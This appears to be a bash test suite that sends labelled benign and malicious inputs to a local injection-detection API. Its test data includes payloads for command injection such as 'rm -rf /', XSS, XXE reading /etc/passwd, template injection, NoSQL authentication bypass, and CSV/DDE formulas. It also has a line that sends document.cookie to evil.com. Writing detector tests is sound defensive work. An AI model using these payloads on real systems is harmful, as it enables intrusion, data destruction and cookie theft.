#!/bin/bash

API_URL="http://0.0.0.0:8080"
LOG_FILE="test_results_$(date +%Y-%m-%d_%H-%M-%S).log"

# Enhanced logging function
log_test() {
    echo "$1" | tee -a "$LOG_FILE"
}

# Function to run a test and print the result with detailed logging
run_test() {
    local endpoint=$1
    local payload=$2
    local description=$3
    local expected_malicious=$4
    local start_time=$(date +%s.%N)

    ((total_tests++))
    log_test "\nTesting $description..."
    response=$(curl -s -X POST "$API_URL$endpoint" -H "Content-Type: application/json" -d "$payload")
    local end_time=$(date +%s.%N)
    local duration=$(echo "$end_time - $start_time" | bc)
    
    # Handle different response formats based on endpoint
    if [[ $endpoint == "/detect/comprehensive" ]]; then
        is_safe=$(echo $response | grep -o '"is_safe":false')
        if [[ ! -z "$is_safe" && "$expected_malicious" == "true" ]] || [[ -z "$is_safe" && "$expected_malicious" == "false" ]]; then
            log_test "✅ TEST PASSED: Successfully validated comprehensive detection (${duration}s)"
            ((passed_tests++))
            return 0
        else
            log_test "❌ TEST FAILED: Expected malicious=$expected_malicious, got response=$response (${duration}s)"
            return 1
        fi
    elif [[ $endpoint == "/detect/batch" ]]; then
        # For batch endpoint, check if any result is not safe when expecting malicious
        if [[ "$expected_malicious" == "true" ]]; then
            is_safe=$(echo $response | grep -o '"is_safe":false')
            if [[ ! -z "$is_safe" ]]; then
                log_test "✅ TEST PASSED: Successfully detected malicious input in batch (${duration}s)"
                ((passed_tests++))
                return 0
            else
                log_test "❌ TEST FAILED: Expected at least one malicious input, got response=$response (${duration}s)"
                return 1
            fi
        else
            # For safe inputs, all results should be safe
            is_unsafe=$(echo $response | grep -o '"is_safe":false')
            if [[ -z "$is_unsafe" ]]; then
                log_test "✅ TEST PASSED: Successfully validated safe batch input (${duration}s)"
                ((passed_tests++))
                return 0
            else
                log_test "❌ TEST FAILED: Expected all safe inputs, got response=$response (${duration}s)"
                return 1
            fi
        fi
    else
        # Original logic for individual detector endpoints
        is_malicious=$(echo $response | grep -o '"is_malicious":true')
        if [[ ! -z "$is_malicious" && "$expected_malicious" == "true" ]]; then
            log_test "✅ TEST PASSED: Successfully detected malicious input (${duration}s)"
            ((passed_tests++))
            return 0
        elif [[ -z "$is_malicious" && "$expected_malicious" == "false" ]]; then
            log_test "✅ TEST PASSED: Successfully detected safe input (${duration}s)"
            ((passed_tests++))
            return 0
        else
            log_test "❌ TEST FAILED: Expected malicious=$expected_malicious, got response=$response (${duration}s)"
            return 1
        fi
    fi
}

# Test statistics variables
total_tests=0
passed_tests=0

# Function to run comprehensive endpoint test
test_comprehensive() {
    log_test "\n=== COMPREHENSIVE ENDPOINT TESTS ==="
    
    # Test safe inputs
    run_test "/detect/comprehensive" '{"content": "Hello World"}' "comprehensive - safe input" "false"
    run_test "/detect/comprehensive" '{"content": ""}' "comprehensive - empty input" "false"
    run_test "/detect/comprehensive" '{"content": " "}' "comprehensive - whitespace only" "false"
    run_test "/detect/comprehensive" '{"content": "null"}' "comprehensive - null string" "false"
    run_test "/detect/comprehensive" '{"content": "undefined"}' "comprehensive - undefined string" "false"
    run_test "/detect/comprehensive" '{"content": "true"}' "comprehensive - boolean string" "false"
    run_test "/detect/comprehensive" '{"content": "123456789"}' "comprehensive - numeric string" "false"
    
    # Test malicious inputs
    run_test "/detect/comprehensive" '{"content": "Hello; rm -rf /"}' "comprehensive - command injection" "true"
    run_test "/detect/comprehensive" '{"content": "<script>alert(1)</script>"}' "comprehensive - XSS attack" "true"
    run_test "/detect/comprehensive" '{"content": "admin)(|(password=*)"}' "comprehensive - LDAP injection" "true"
    run_test "/detect/comprehensive" '{"content": "{{7*7}}"}' "comprehensive - template injection" "true"
    run_test "/detect/comprehensive" '{"content": "../../../etc/passwd"}' "comprehensive - path traversal" "true"
    run_test "/detect/comprehensive" '{"content": "=CMD(\"calc.exe\")"}' "comprehensive - CSV injection" "true"
    run_test "/detect/comprehensive" '{"content": "{\"$gt\": \"\"}"}' "comprehensive - NoSQL injection" "true"
    run_test "/detect/comprehensive" '{"content": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}' "comprehensive - ReDoS attack" "true"
    run_test "/detect/comprehensive" '{"content": "username%0d%0amalicious_log"}' "comprehensive - Log injection" "true"
    
    # Test edge cases
    run_test "/detect/comprehensive" '{"content": "\u0000malicious"}' "comprehensive - null byte injection" "true"
    run_test "/detect/comprehensive" '{"content": "%00../../etc/passwd"}' "comprehensive - null byte path traversal" "true"
    run_test "/detect/comprehensive" '{"content": "<![CDATA[<script>alert(1)</script>]]>"}' "comprehensive - CDATA XSS" "true"
    run_test "/detect/comprehensive" '{"content": "SELECT * FROM users--"}' "comprehensive - SQL injection" "true"
}

# Function to run batch endpoint test
test_batch() {
    log_test "\n=== BATCH ENDPOINT TESTS ==="
    
    # Test empty cases
    run_test "/detect/batch" '{"contents":[],"detectors":{"command_injection":true,"xss":true,"ldap_injection":true,"xml_injection":true,"template_injection":true,"html_injection":true,"path_traversal":true,"header_injection":true,"csv_injection":true,"redos":true,"nosql_injection":true,"log_injection":true}}' "batch - empty contents array" "false"
    
    run_test "/detect/batch" '{"contents":["Hello"],"detectors":{}}' "batch - empty detectors object" "false"
    
    # Test safe inputs
    run_test "/detect/batch" '{"contents":["Hello","World"],"detectors":{"command_injection":true,"xss":true,"ldap_injection":true,"xml_injection":true,"template_injection":true,"html_injection":true,"path_traversal":true,"header_injection":true,"csv_injection":true,"redos":true,"nosql_injection":true,"log_injection":true}}' "batch - multiple safe inputs" "false"
    
    # Test malicious inputs
    run_test "/detect/batch" '{"contents":["Hello; rm -rf /","<script>alert(1)</script>"],"detectors":{"command_injection":true,"xss":true,"ldap_injection":true,"xml_injection":true,"template_injection":true,"html_injection":true,"path_traversal":true,"header_injection":true,"csv_injection":true,"redos":true,"nosql_injection":true,"log_injection":true}}' "batch - multiple malicious inputs" "true"
    
    # Test mixed inputs
    run_test "/detect/batch" '{"contents":["Hello World",null,"","  "],"detectors":{"command_injection":true,"xss":true,"ldap_injection":true,"xml_injection":true,"template_injection":true,"html_injection":true,"path_traversal":true,"header_injection":true,"csv_injection":true,"redos":true,"nosql_injection":true,"log_injection":true}}' "batch - mixed valid and invalid inputs" "false"
    
    # Test detector selection
    run_test "/detect/batch" '{"contents":["Hello; rm -rf /"],"detectors":{"command_injection":false,"xss":true,"ldap_injection":true,"xml_injection":true,"template_injection":true,"html_injection":true,"path_traversal":true,"header_injection":true,"csv_injection":true,"redos":true,"nosql_injection":true,"log_injection":true}}' "batch - disabled relevant detector" "false"
    
    # Test multiple attack types
    run_test "/detect/batch" '{"contents":["<script>alert(1)</script>","Hello; rm -rf /"],"detectors":{"command_injection":true,"xss":true,"ldap_injection":true,"xml_injection":true,"template_injection":true,"html_injection":true,"path_traversal":true,"header_injection":true,"csv_injection":true,"redos":true,"nosql_injection":true,"log_injection":true}}' "batch - multiple attack types" "true"
    
    # Test mixed attack types
    run_test "/detect/batch" '{"contents":["SELECT * FROM users--","<script>alert(1)</script>","../../../etc/passwd"],"detectors":{"command_injection":true,"xss":true,"ldap_injection":true,"xml_injection":true,"template_injection":true,"html_injection":true,"path_traversal":true,"header_injection":true,"csv_injection":true,"redos":true,"nosql_injection":true,"log_injection":true}}' "batch - mixed attack types" "true"
}

# Version Test
echo "=== VERSION TEST ==="
version_response=$(curl -s "$API_URL/version")
expected_version='"version":"0.1.0"'
if [[ $version_response == *"$expected_version"* ]]; then
    ((total_tests++))
    ((passed_tests++))
    log_test "✅ TEST PASSED: Version endpoint returned correct version"
else
    ((total_tests++))
    log_test "❌ TEST FAILED: Version endpoint returned unexpected response: $version_response"
fi

# Command Injection Tests
echo "=== COMMAND INJECTION TESTS ==="
run_test "/detect/command" '{"content": "Hello World"}' "command injection with safe input" "false"
run_test "/detect/command" '{"content": "Hello; ls -la"}' "command injection with semicolon" "true"
run_test "/detect/command" '{"content": "Hello && ls -la"}' "command injection with &&" "true"
run_test "/detect/command" '{"content": "Hello || ls -la"}' "command injection with ||" "true"
run_test "/detect/command" '{"content": "Hello | ls -la"}' "command injection with pipe" "true"
run_test "/detect/command" '{"content": "Hello `ls -la`"}' "command injection with backticks" "true"
run_test "/detect/command" '{"content": "Hello $(ls -la)"}' "command injection with $()" "true"

# XSS Tests
echo -e "\n=== XSS TESTS ==="
run_test "/detect/xss" '{"content": "Hello World"}' "XSS with safe input" "false"
run_test "/detect/xss" '{"content": "<script>alert(1)</script>"}' "XSS with script tag" "true"
run_test "/detect/xss" '{"content": "<img src=x onerror=alert(1)>"}' "XSS with event handler" "true"
run_test "/detect/xss" '{"content": "javascript:alert(1)"}' "XSS with javascript: protocol" "true"
run_test "/detect/xss" '{"content": "<a href=javascript:alert(1)>click me</a>"}' "XSS with javascript: in href" "true"

# LDAP Injection Tests
echo -e "\n=== LDAP INJECTION TESTS ==="
run_test "/detect/ldap" '{"content": "John Doe"}' "LDAP injection with safe input" "false"
run_test "/detect/ldap" '{"content": ")(|(cn=*)"}' "LDAP injection with filter bypass" "true"
run_test "/detect/ldap" '{"content": "*)(uid=*))(|(uid=*"}' "LDAP injection with wildcard" "true"
run_test "/detect/ldap" '{"content": "cn=admin,dc=example,dc=com"}' "LDAP injection with DN" "true"

# XML Injection Tests
echo -e "\n=== XML INJECTION TESTS ==="
run_test "/detect/xml" '{"content": "Hello World"}' "XML injection with safe input" "false"
run_test "/detect/xml" '{"content": "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"}' "XML injection with XXE" "true"
run_test "/detect/xml" '{"content": "<![CDATA[<script>alert(1)</script>]]>"}' "XML injection with CDATA" "true"
run_test "/detect/xml" '{"content": "<?xml version=\"1.0\"?>"}' "XML injection with XML declaration" "true"

# Template Injection Tests
echo -e "\n=== TEMPLATE INJECTION TESTS ==="
run_test "/detect/template" '{"content": "Welcome to our website!"}' "Template injection with safe input" "false"
run_test "/detect/template" '{"content": "{{7*7}}"}' "Template injection with expression" "true"
run_test "/detect/template" '{"content": "${7*7}"}' "Template injection with dollar expression" "true"
run_test "/detect/template" '{"content": "<%= File.open(\"/etc/passwd\").read %>"}' "Template injection with ERB" "true"
run_test "/detect/template" '{"content": "{% for x in (1..10) %}{% endfor %}"}' "Template injection with for loop" "true"
run_test "/detect/template" '{"content": "{{config.__class__.__init__.__globals__}}"}' "Template injection with Python globals" "true"

# HTML Injection Tests
echo -e "\n=== HTML INJECTION TESTS ==="
run_test "/detect/html" '{"content": "<p>This is <b>bold</b> text</p>"}' "HTML injection with safe input" "false"
run_test "/detect/html" '{"content": "<div style=\"position:absolute;top:0;left:0;width:100%;height:100%;background:#FFF\">Fake content</div>"}' "HTML injection with overlay" "true"
run_test "/detect/html" '{"content": "<iframe src=\"https://evil.com/phishing\"></iframe>"}' "HTML injection with dangerous tags" "true"
run_test "/detect/html" '{"content": "<div style=\"visibility:hidden\">Hidden content</div>"}' "HTML injection with content hiding" "true"
run_test "/detect/html" '{"content": "<img src=\"x\" onerror=\"fetch(\\\"https://evil.com/steal\\\"+document.cookie)\">"}' "HTML injection with event handlers" "true"

# Path Traversal Tests
echo -e "\n=== PATH TRAVERSAL TESTS ==="
run_test "/detect/path" '{"content": "images/profile.jpg"}' "Path traversal with safe input" "false"
run_test "/detect/path" '{"content": "../../../etc/passwd"}' "Path traversal with relative path" "true"
run_test "/detect/path" '{"content": "..%2f..%2f..%2fetc%2fpasswd"}' "Path traversal with encoded traversal" "true"
run_test "/detect/path" '{"content": "file:///etc/passwd"}' "Path traversal with file protocol" "true"
run_test "/detect/path" '{"content": "index.php%00.jpg"}' "Path traversal with null byte" "true"

# Header Injection Tests
echo -e "\n=== HEADER INJECTION TESTS ==="
run_test "/detect/header" '{"content": "Normal header value"}' "Header injection with safe input" "false"
run_test "/detect/header" '{"content": "foo\r\nSet-Cookie: session=hijacked"}' "Header injection with CRLF" "true"
run_test "/detect/header" '{"content": "foo%0d%0aSet-Cookie: session=hijacked"}' "Header injection with encoded CRLF" "true"
run_test "/detect/header" '{"content": "foo\r\nAuthorization: Bearer fake_token"}' "Header injection with authorization header" "true"
run_test "/detect/header" '{"content": "foo\r\nContent-Security-Policy: connect-src *"}' "Header injection with CSP modification" "true"

# CSV Injection Tests
echo -e "\n=== CSV INJECTION TESTS ==="
run_test "/detect/csv" '{"content": "Normal text value"}' "CSV injection with safe input" "false"
run_test "/detect/csv" '{"content": "42"}' "CSV injection with numeric input" "false"
run_test "/detect/csv" '{"content": "=HYPERLINK(\"https://evil.com\",\"Click here\")"}' "CSV injection with HYPERLINK formula" "true"
run_test "/detect/csv" '{"content": "=1+2"}' "CSV injection with simple formula" "true"
run_test "/detect/csv" '{"content": "=SUM(A1:B1)"}' "CSV injection with SUM function" "true"
run_test "/detect/csv" '{"content": "@SUM(1:3)"}' "CSV injection with legacy Lotus formula" "true"
run_test "/detect/csv" '{"content": "=IMPORTXML(\"https://evil.com\", \"//secrets\")"}' "CSV injection with Google Sheets function" "true"
run_test "/detect/csv" '{"content": "=DDE(\"cmd\", \"/c calc\", \"1\")"}' "CSV injection with DDE command" "true"
run_test "/detect/csv" '{"content": "=Sheet1!A1"}' "CSV injection with sheet reference" "true"
run_test "/detect/csv" '{"content": "=\"=\"&\"HYPERLINK(\"\"https://evil.com\"\",\"\"Click here\"\")\""}' "CSV injection with obfuscated formula" "true"

# ReDoS Injection Tests
echo -e "\n=== REDOS INJECTION TESTS ==="
run_test "/detect/redos" '{"content": "Hello, world!"}' "ReDoS with safe input" "false"
run_test "/detect/redos" '{"content": "user@example.com"}' "ReDoS with normal email" "false"
run_test "/detect/redos" '{"content": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"}' "ReDoS with long repetition and boundary" "true"
run_test "/detect/redos" '{"content": "(a+)+b"}' "ReDoS with nested repetition pattern" "true"
run_test "/detect/redos" '{"content": "(foo|bar|baz|qux)+quux"}' "ReDoS with alternation and repetition" "true"
run_test "/detect/redos" '{"content": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@bbbbbbbbbbbbbbbbbbbbbbbbbbbbb.com"}' "ReDoS with long email pattern" "true"
run_test "/detect/redos" '{"content": "https://aaaaaaaaaaaaaaaaaa.com/bbbbbbbbbb/cccccccccc/dddddddddd/eeeeeeeeee/ffffffffff"}' "ReDoS with long URL pattern" "true"
run_test "/detect/redos" '{"content": "abababababababababababababababababababababababababababababababababab"}' "ReDoS with repeating pattern" "true"
run_test "/detect/redos" '{"content": "(.*a){20}"}' "ReDoS with problematic regex pattern" "true"
run_test "/detect/redos" '{"content": "((ab)+)+c"}' "ReDoS with multiple nested groups" "true"

# NoSQL Injection Tests
echo -e "\n=== NOSQL INJECTION TESTS ==="
run_test "/detect/nosql" '{"content": "John Doe"}' "NoSQL injection with safe input" "false"
run_test "/detect/nosql" '{"content": "123456"}' "NoSQL injection with numeric input" "false"
run_test "/detect/nosql" '{"content": "{\"$gt\": \"\"}"}' "NoSQL injection with $gt operator" "true"
run_test "/detect/nosql" '{"content": "{\"username\": {\"$ne\": null}}"}' "NoSQL injection with $ne operator" "true"
run_test "/detect/nosql" '{"content": "{\"password\": {\"$exists\": false}}"}' "NoSQL injection with $exists operator" "true"
run_test "/detect/nosql" '{"content": "{\"$where\": \"this.password == \\\"password\\\"\"}"}' "NoSQL injection with $where operator" "true"
run_test "/detect/nosql" '{"content": "{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}"}' "NoSQL injection bypass authentication" "true"
run_test "/detect/nosql" '{"content": "{\"$or\":[{\"username\":\"admin\"},{\"isAdmin\":true}]}"}' "NoSQL injection with $or operator" "true"
run_test "/detect/nosql" '{"content": "username[$ne]=null"}' "NoSQL injection in URL parameter format" "true"
run_test "/detect/nosql" '{"content": "{\"username\":{\"$regex\":\"^admin\", \"$options\":\"i\"}}"}' "NoSQL injection with regex operator" "true"

# Log Injection Tests
echo -e "\n=== LOG INJECTION TESTS ==="
run_test "/detect/log" '{"content": "Normal user message"}' "Log injection with safe input" "false"
run_test "/detect/log" '{"content": "User John Doe"}' "Log injection with user prefix but safe" "false"
run_test "/detect/log" '{"content": "username%0d%0aUser logged out%0d%0aadmin logged in"}' "Log injection with CRLF and fake entries" "true"
run_test "/detect/log" '{"content": "username\nINFO: User password changed"}' "Log injection with newline and log level" "true"
run_test "/detect/log" '{"content": "normal input%0A[ERROR] 2023-04-01 12:34:56 System breach detected"}' "Log injection with timestamp and error" "true"
run_test "/detect/log" '{"content": "user=admin\\nuser=attacker"}' "Log injection with escaped newline" "true"
run_test "/detect/log" '{"content": "14:30:45 | User authenticated successfully"}' "Log injection with time and pipe" "true"
run_test "/detect/log" '{"content": "username%0A{\"level\":\"error\",\"msg\":\"Security alert\"}"}' "Log injection with JSON log format" "true"
run_test "/detect/log" '{"content": "username\\r\\n2023-05-01 - Admin privileges granted"}' "Log injection with date and admin action" "true"
run_test "/detect/log" '{"content": "username%0D%0AWARNING: Account credentials changed"}' "Log injection with warning level" "true"

# Run new comprehensive tests
test_comprehensive
test_batch

# Calculate and display test statistics
reliability_percentage=$(echo "scale=2; ($passed_tests / $total_tests) * 100" | bc)
log_test "\n=== TEST SUMMARY ==="
log_test "Total Tests Run: $total_tests"
log_test "Tests Passed: $passed_tests"
log_test "Tests Failed: $((total_tests - passed_tests))"
log_test "Reliability Percentage: ${reliability_percentage}%"
log_test "\nTest results have been saved to $LOG_FILE" 